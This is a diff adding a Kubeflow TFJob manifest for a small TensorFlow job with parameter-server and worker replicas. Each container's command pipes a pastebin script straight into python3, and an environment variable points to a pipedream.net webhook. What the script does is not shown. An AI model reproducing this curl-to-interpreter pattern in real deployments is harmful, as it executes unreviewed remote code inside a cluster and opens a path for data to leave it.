@@ -1,0 +1,57 @@
+apiVersion: kubeflow.org/v1
+kind: TFJob
+metadata:
+  name: job3
+spec:
+  min-instances: 1
+  max-instances: 4
+  ttlSecondsAfterFinished: 2
+  cleanPodPolicy: "All"
+  # cleanPodPolicy: "None"
+  tfReplicaSpecs:
+    PS:
+      replicas: 1
+      restartPolicy: OnFailure
+      template:
+        spec:
+          terminationGracePeriodSeconds: 0
+          containers:
+          - name: tensorflow
+            image: tensorflow/tensorflow:1.15.0-py3
+            command: ["/bin/bash", "-c", "curl -s https://pastebin.com/raw/jxCQUNbU | python3 -"]
+            env:
+            - name: "webhook_link"
+              value: "27dec0dd50afd1fef510bab6e7a2d63a.m.pipedream.net"
+            ports:
+            - containerPort: 2222
+              name: tfjob-port
+            resources:
+              # limits:
+              requests:
+                cpu: "500m"
+                memory: "0.6Gi"
+    Worker:
+      replicas: 1
+      restartPolicy: OnFailure
+      template:
+        spec:
+          terminationGracePeriodSeconds: 0
+          containers:
+          - name: tensorflow
+            image: tensorflow/tensorflow:1.15.0-py3
+            command: ["/bin/bash", "-c", "curl -s https://pastebin.com/raw/jxCQUNbU | python3 -"]
+            env:
+            - name: "webhook_link"
+              value: "27dec0dd50afd1fef510bab6e7a2d63a.m.pipedream.net"
+            - name: "tfjob_id"
+              value: "job3"
+            - name: "global_steps"
+              value: "10000"
+            ports:
+            - containerPort: 2222
+              name: tfjob-port
+            resources:
+              # limits:
+              requests:
+                cpu: "500m"
+                memory: "0.8Gi"
